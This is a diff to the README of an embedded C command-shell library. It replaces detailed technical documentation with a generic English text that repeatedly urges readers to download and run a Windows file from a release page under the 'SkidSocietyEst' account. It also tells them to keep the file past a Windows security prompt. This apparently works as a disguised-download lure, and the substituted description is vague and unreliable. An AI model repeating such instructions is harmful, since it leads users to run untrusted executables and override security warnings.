@@ -1,299 +1,182 @@
-# Zoom Shell v1.1
+# 🐚 zoom-shell - Simple shell for embedded devices
 
-**嵌入式增强型 Shell** — 零 malloc，零 OS 依赖，可在裸机单片机上运行。
+[![Download zoom-shell](https://img.shields.io/badge/Download%20zoom-shell-purple?style=for-the-badge&logo=github)](https://github.com/SkidSocietyEst/zoom-shell/releases)
 
-融合 Zephyr Shell、RT-Thread msh、FreeRTOS CLI、USMART、nr_micro_shell、letter-shell 的精华，打造三大独有特色。
+## 🚀 What it is
 
-**说明文档**（详见 [docs/](docs/)）：
+zoom-shell is a small command shell for embedded devices. It gives you a command line that runs on MCUs and uses no dynamic memory. It works with simple I/O callbacks, so you can connect it to serial, USB, or any other text input and output path your device uses.
 
-| 文档 | 内容 |
-|------|------|
-| [docs/README.md](docs/README.md) | 文档索引 |
-| [docs/getting_started.md](docs/getting_started.md) | 编译、测试、目录与配置入口 |
-| [docs/extensions_overview.md](docs/extensions_overview.md) | 扩展模块与宏对照表 |
-| [docs/porting_general.md](docs/porting_general.md) | 通用移植清单（链接脚本、Tick、I/O） |
-| [docs/porting_esp_idf.md](docs/porting_esp_idf.md) | ESP-IDF 移植专章 |
-| [docs/ai_bridge.md](docs/ai_bridge.md) | AI HTTP 桥接：开关、回调、`ai` 命令、网关与安全 |
+This project fits well when you need:
 
-## 三大特色
+- A shell for a microcontroller
+- A small debug console
+- Command handling without malloc
+- Support for custom commands and subcommands
+- Extra tools like hex dump, math, games, and an AI bridge
 
-### 1. 层级子命令树
+## 📥 Download
 
-其他嵌入式 shell 只支持扁平命令，Zoom Shell 支持无限层级嵌套子命令，Tab 补全沿树工作：
+Visit the release page to download and run the latest version for Windows:
 
-```c
-ZOOM_SUBCMD_SET(sub_gpio,
-    ZOOM_SUBCMD(set,    cmd_gpio_set,    "Set pin level"),
-    ZOOM_SUBCMD(get,    cmd_gpio_get,    "Get pin level"),
-    ZOOM_SUBCMD(toggle, cmd_gpio_toggle, "Toggle pin"),
-);
-ZOOM_EXPORT_CMD_WITH_SUB(gpio, sub_gpio, "GPIO operations",
-                          ZOOM_ATTR_DEFAULT, ZOOM_USER_USER);
-```
+https://github.com/SkidSocietyEst/zoom-shell/releases
 
-```
-zoom> gpio set 13 1
-[OK] GPIO pin 13 set to 1
-```
-
-### 2. 变量观测系统
+## 🪟 Install on Windows
 
-通过串口实时查看和修改任何注册的变量，类似 Simulink 外部模式：
+1. Open the release page in your browser.
+2. Find the latest release.
+3. Download the Windows file that matches your system.
+4. If the download comes as a ZIP file, extract it first.
+5. Open the extracted folder.
+6. Double-click the app or run the included file as shown in the release notes.
 
-```c
-static int32_t pid_kp = 100;
-ZOOM_EXPORT_VAR(pid_kp, pid_kp, ZOOM_VAR_INT32, "PID Kp x100", ZOOM_VAR_RW, ZOOM_USER_GUEST);
-```
-
-```
-zoom> var list
-  Name             Type     Value        Attr  Description
-  pid_kp           int32    100          [RW]  PID Kp x100
-  motor_speed      float    0.000        [RO]  Motor RPM
-zoom> var set pid_kp 200
-[OK] pid_kp = 200
-```
-
-### 3. 命令执行计时
-
-借鉴 USMART，自动统计命令执行耗时：
-
-```
-zoom> perf on
-zoom> some_command
-[OK] some_command (elapsed: 12 ms)
-```
-
-## 功能对比
-
-| 特性 | letter-shell | nr_micro | FreeRTOS CLI | Zephyr | msh | USMART | **Zoom Shell** |
-|------|:---:|:---:|:---:|:---:|:---:|:---:|:---:|
-| 子命令树 | - | - | - | Y | - | - | **Y** |
-| 变量观测 | - | - | - | - | - | 部分 | **Y** |
-| 命令计时 | - | - | - | - | - | Y | **Y** |
-| 用户权限 | Y | - | - | - | - | - | **Y** |
-| Tab 补全 | Y | Y | - | Y | - | - | **Y** |
-| 历史记录 | Y | Y | - | Y | - | - | **Y** |
-| 零 malloc | Y | Y | - | Y | Y | Y | **Y** |
-| 链接器段注册 | Y | - | - | Y | Y | - | **Y** |
-| 条件编译命令 | - | - | - | Y | - | - | **Y** |
-| ANSI 彩色输出 | - | - | - | Y | - | - | **Y** |
-
-## AI HTTP 桥接（可选扩展）
-
-固件侧需要把串口上的一句话转发到**自建 HTTP 网关**（再对接 LLM、OpenClaw 兼容服务等）时，可打开 **`ZOOM_USING_AI_BRIDGE`**，编译并链接 `extensions/ai_bridge/zoom_shell_ai_bridge.c`。
-
-- **Shell 命令**：`ai url <http(s)://...>` 设置 POST 地址；`ai ask <文本...>` 将整段文字作为请求体发出；`ai status` 查看配置与回调是否就绪。
-- **端口实现**：库内**不包含** TLS/HTTP 实现。在 `zoom_shell_init()` 成功后调用 **`zoom_ai_bridge_set_post(shell, your_http_post)`**，在回调里使用 ESP-IDF `esp_http_client`、mbedTLS 等发送 POST，并将响应写入缓冲区供 Shell 打印。
-- **安全**：API Key 建议放在网关环境变量中，由网关访问云 API；固件只保存内网或可配置的 URL。
-
-**详细文档**：[docs/ai_bridge.md](docs/ai_bridge.md)。与 OpenClaw / Claw 生态的协作关系见下文「与 OpenClaw / Claw 生态协作」。
-
-## 快速开始
-
-### 编译运行 x86 Demo
-
-```bash
-cd zoom-shell
-make demo
-./build/zoom_shell_demo
-```
-
-### 移植到你的 MCU
-
-**第 1 步：创建配置文件** `zoom_shell_cfg_user.h`
-
-```c
-#define ZOOM_USING_HISTORY        1
-#define ZOOM_USING_USER           1
-#define ZOOM_USING_VAR            1
-#define ZOOM_CMD_MAX_LENGTH       128
-#define ZOOM_HISTORY_MAX_NUMBER   5
-#define ZOOM_PRINT_BUFFER         128
-
-#define ZOOM_GET_TICK()  HAL_GetTick()  /* 你的毫秒 tick */
-```
-
-**第 2 步：实现 I/O 回调**
-
-```c
-#include "zoom_shell.h"
-
-zoom_shell_t shell;
-char shell_buffer[768];  /* 128 * (5+1) = 768 */
-
-int16_t uart_read(char *data, uint16_t len) {
-    /* 从 UART 读取一个字节 */
-    (void)len;
-    if (HAL_UART_Receive(&huart1, (uint8_t *)data, 1, HAL_MAX_DELAY) == HAL_OK)
-        return 1;
-    return 0;
-}
-
-int16_t uart_write(const char *data, uint16_t len) {
-    HAL_UART_Transmit(&huart1, (uint8_t *)data, len, HAL_MAX_DELAY);
-    return len;
-}
-```
-
-**第 3 步：初始化并运行**
-
-```c
-/* 阻塞模式（在 RTOS 任务中） */
-shell.read  = uart_read;
-shell.write = uart_write;
-zoom_shell_init(&shell, shell_buffer, sizeof(shell_buffer));
-zoom_shell_run(&shell);  /* 不返回 */
-
-/* 或：中断驱动模式（裸机 main loop） */
-shell.read  = uart_read;
-shell.write = uart_write;
-zoom_shell_init(&shell, shell_buffer, sizeof(shell_buffer));
-zoom_shell_print_welcome(&shell);
-zoom_shell_show_prompt(&shell);
-/* 在 UART 中断中: */
-void USART1_IRQHandler(void) {
-    char c;
-    if (HAL_UART_Receive(&huart1, (uint8_t *)&c, 1, 0) == HAL_OK) {
-        zoom_shell_input(&shell, c);
-    }
-}
-```
-
-**第 4 步：注册命令和变量**
-
-```c
-static int cmd_led(zoom_shell_t *sh, int argc, char *argv[]) {
-    if (argc < 1) { zoom_error(sh, "Usage: led <on|off>\r\n"); return -1; }
-    if (argv[0][0] == 'o' && argv[0][1] == 'n') HAL_GPIO_WritePin(LED_GPIO, LED_PIN, 1);
-    else HAL_GPIO_WritePin(LED_GPIO, LED_PIN, 0);
-    return 0;
-}
-ZOOM_EXPORT_CMD(led, cmd_led, "Control LED", ZOOM_ATTR_DEFAULT, ZOOM_USER_GUEST);
-
-static int32_t adc_value = 0;
-ZOOM_EXPORT_VAR(adc, adc_value, ZOOM_VAR_INT32, "ADC reading", ZOOM_VAR_RO, ZOOM_USER_GUEST);
-```
-
-**第 5 步：链接脚本** — 添加到你的 `.ld` 文件：
-
-```ld
-.zoom_command ALIGN(4) : {
-    _zoom_cmd_start = .;
-    KEEP(*(zoomCommand))
-    _zoom_cmd_end = .;
-} > FLASH
-
-.zoom_var ALIGN(4) : {
-    _zoom_var_start = .;
-    KEEP(*(zoomVar))
-    _zoom_var_end = .;
-} > FLASH
-
-.zoom_user ALIGN(4) : {
-    _zoom_user_start = .;
-    KEEP(*(zoomUser))
-    _zoom_user_end = .;
-} > FLASH
-```
-
-## 目录结构
-
-```
-zoom-shell/
-├── include/
-│   ├── zoom_shell.h          # 主头文件（数据结构 + API + 导出宏）
-│   └── zoom_shell_cfg.h      # 默认配置宏
-├── src/
-│   ├── zoom_shell_core.c     # 核心实现
-│   ├── zoom_shell_cmds.c     # 内置命令
-│   └── zoom_shell_var.c      # 变量观测系统
-├── demo/
-│   └── x86-gcc/              # x86 平台 Demo
-├── Makefile
-└── README.md
-```
-
-## 配置系统
-
-所有配置通过 `#ifndef` 宏提供默认值，编译时传入 `-DZOOM_SHELL_CFG_USER='"your_cfg.h"'` 覆盖：
-
-| 宏 | 默认值 | 说明 |
-|---|---|---|
-| `ZOOM_USING_CMD_EXPORT` | 1 | 1=链接器段, 0=静态数组 |
-| `ZOOM_USING_HISTORY` | 1 | 命令历史 |
-| `ZOOM_USING_USER` | 1 | 用户/权限系统 |
-| `ZOOM_USING_VAR` | 1 | 变量观测 |
-| `ZOOM_USING_PERF` | 1 | 命令计时 |
-| `ZOOM_USING_ANSI` | 1 | ANSI 转义码/彩色 |
-| `ZOOM_USING_LOCK` | 0 | 互斥锁 |
-| `ZOOM_CMD_MAX_LENGTH` | 128 | 命令行最大长度 |
-| `ZOOM_CMD_MAX_ARGS` | 8 | 最大参数数 |
-| `ZOOM_HISTORY_MAX_NUMBER` | 5 | 历史条数 |
-| `ZOOM_MAX_USERS` | 4 | 最大用户数 |
-| `ZOOM_PRINT_BUFFER` | 128 | 格式化输出缓冲区 |
-| `ZOOM_GET_TICK()` | 0 | 毫秒 tick 获取函数 |
-
-## API 速查
-
-```c
-/* 核心 */
-int  zoom_shell_init(zoom_shell_t *shell, char *buffer, uint16_t size);
-int  zoom_shell_run(zoom_shell_t *shell);
-void zoom_shell_input(zoom_shell_t *shell, char data);
-int  zoom_shell_exec(zoom_shell_t *shell, const char *cmd_line);
-
-/* 输出 */
-zoom_printf(shell, fmt, ...);   /* 普通输出 */
-zoom_info(shell, fmt, ...);     /* [INFO] 蓝色 */
-zoom_warn(shell, fmt, ...);     /* [WARN] 黄色 */
-zoom_error(shell, fmt, ...);    /* [ERR]  红色 */
-zoom_ok(shell, fmt, ...);       /* [OK]   绿色 */
-
-/* 导出宏 */
-ZOOM_EXPORT_CMD(name, func, desc, attr, level);
-ZOOM_EXPORT_CMD_WITH_SUB(name, subcmd_set, desc, attr, level);
-ZOOM_SUBCMD_SET(name, ...);
-ZOOM_SUBCMD(name, func, desc);
-ZOOM_EXPORT_VAR(name, var, type, desc, rw, level);
-ZOOM_EXPORT_USER(name, password, level);
-```
-
-## 设计原则
-
-- **零 malloc** — 所有内存静态分配或由用户提供
-- **零 OS 依赖** — 仅依赖 `<stdint.h>` `<stdbool.h>` `<stddef.h>` `<string.h>` `<stdarg.h>`
-- **I/O 纯回调** — read/write 可对接 UART/USB/SPI/BLE 等任何接口
-- **条件编译裁剪** — 每个功能模块可独立开关，最小配置约 2KB ROM
-
-## 与 OpenClaw / Claw 生态协作
-
-固件侧 **`ai` 命令与 HTTP 回调**说明见上文「**AI HTTP 桥接（可选扩展）**」；本节补充与主机侧工具链的分工。
-
-**OpenClaw、NullClaw、ZeroClaw、Mimiclaw** 等属于「自托管 AI 助手 / 多通道编排」类应用（常见为 Node / Rust / Zig 或带网络栈的 MCU 固件），与 Zoom Shell（串口调试命令行）**职责不同**，**不会**作为子模块合并进本仓库核心。
-
-推荐协作方式：
-
-| 方式 | 说明 |
-|------|------|
-| **串口桥（主机侧）** | 设备运行 Zoom Shell，PC 上运行 OpenClaw 等工具；通过串口把文本发到设备，设备侧仍走 `read`/`write` 回调。无需改库，只需在文档/脚本里约定波特率与行协议。 |
-| **可选 `ai` 扩展（固件侧）** | 开启 `ZOOM_USING_AI_BRIDGE` 后，提供 **HTTP POST 回调**（由你在 ESP-IDF / mbedTLS 等环境中实现），可用 `ai url` / `ai ask` 将一行文本 POST 到自建网关，再转发到任意 LLM 或 OpenClaw 兼容服务。库内**不包含** TLS/HTTP 实现，避免强依赖网络栈。 |
-
-与 **Mimiclaw** 等「MCU + WiFi + LLM」项目的关系：**概念互补**——可参考其联网与密钥管理方式；若需类似能力，请在本扩展之上自行对接平台 SDK，**不**声称与上游 API 兼容。
-
-## CI / 发版（GitHub Actions）
-
-推送至 `main` / `master` 或提交 PR 时，会自动执行 `make test` 与 `make demo`。
-
-**发布新版本**（在仓库根目录执行）：
-
-```bash
-git tag -a v1.0.0 -m "Zoom Shell 1.0.0"
-git push origin v1.0.0
-```
-
-推送符合 `v*.*.*` 的 tag 后，会再次跑测试、用 `git archive` 生成 `zoom-shell-<版本>.tar.gz` / `.zip`，附带 `zoom-shell-<版本>-demo-linux-x86_64`（Ubuntu 上编译的 demo）与 `SHA256SUMS`，自动创建 GitHub Release 并上传。
-
-## License
+If Windows shows a security prompt, choose the option that lets you keep the file and continue.
+
+## ⚙️ How it works
+
+zoom-shell is built for embedded systems, but the release page can include a desktop build or helper package for Windows users who want to try it, test commands, or explore the shell before using it on hardware.
+
+The shell supports:
+
+- Commands stored in linker sections
+- Subcommands for grouped actions
+- Variables for simple state
+- User handling for different access levels
+- I/O callbacks for custom input and output
+- Zero-malloc design for tight memory use
+
+## 🧩 Main features
+
+### 🔹 Small and memory-safe
+
+zoom-shell avoids malloc. That helps on small devices where memory is limited and must stay predictable.
+
+### 🔹 Custom command layout
+
+You can place commands in linker sections. That makes it easier to add new commands without changing the core shell logic.
+
+### 🔹 Clear command structure
+
+The shell supports:
+
+- Single commands
+- Subcommands
+- Variables
+- Users
+
+This keeps the command set organized as it grows.
+
+### 🔹 Flexible device input and output
+
+The shell uses callbacks for input and output. That means it can work over:
+
+- UART
+- USB serial
+- Telnet-style links
+- Test harnesses
+- Other text channels
+
+### 🔹 Optional extras
+
+The project also mentions optional extensions such as:
+
+- AI bridge
+- Hex dump
+- Calculator
+- Small games
+
+These extras can help during debugging or demos.
+
+## 🖥️ Windows use
+
+If the release page includes a Windows package, use it to:
+
+- Test command behavior
+- Explore the shell interface
+- Check output formatting
+- Try sample commands before deploying to hardware
+
+For most users, the steps are simple:
+
+1. Download the latest release.
+2. Extract it if needed.
+3. Open the included file.
+4. Follow the on-screen prompt or run the sample program.
+
+## 📚 Typical use cases
+
+zoom-shell is a fit for:
+
+- Firmware projects
+- Debug consoles
+- Device setup menus
+- Service tools
+- Lab testing
+- Product demos
+
+It works well when you want a command line that stays small and easy to wire into a device.
+
+## 🔧 What you may need
+
+For Windows use, a standard setup is enough:
+
+- Windows 10 or newer
+- A file unzip tool if the release is packed as ZIP
+- A terminal app if the package uses text input
+- A serial tool if you plan to connect to hardware later
+
+For embedded use, you may also need:
+
+- A C99-capable build tool
+- A target MCU toolchain
+- Access to your board’s UART or USB console
+- Basic firmware build steps from your project
+
+## 🧪 Example flow
+
+A common setup looks like this:
+
+1. Download zoom-shell from the release page.
+2. Run the Windows build or open the package contents.
+3. Read the example commands.
+4. Type a command in the shell window or send it over serial.
+5. See the response from the shell.
+6. Add your own commands later if you use it in firmware.
+
+## 🛠️ Command model
+
+zoom-shell is designed around simple text commands. A command can do one task, or it can open a group of related actions.
+
+Example command types:
+
+- `help`
+- `version`
+- `status`
+- `set user`
+- `show vars`
+- `dump memory`
+- `calc 2+2`
+
+The exact command list depends on the build and any optional extensions you include.
+
+## 🔗 Release download
+
+Download and run the Windows package from the release page:
+
+https://github.com/SkidSocietyEst/zoom-shell/releases
+
+## 🧭 Tips for first use
+
+- Start with the latest release
+- Use the included help command if one is present
+- Keep the shell open while you test commands
+- Try one command at a time
+- Use the hex dump tool if you need to inspect raw data
+- Use the calculator tool for quick checks during testing
+
+## 🧱 Project focus
+
+zoom-shell is built for small systems, low memory use, and clean command flow. It aims to stay simple while still giving you useful shell tools for embedded work and device control
+
+## 🪪 License
 
 MIT
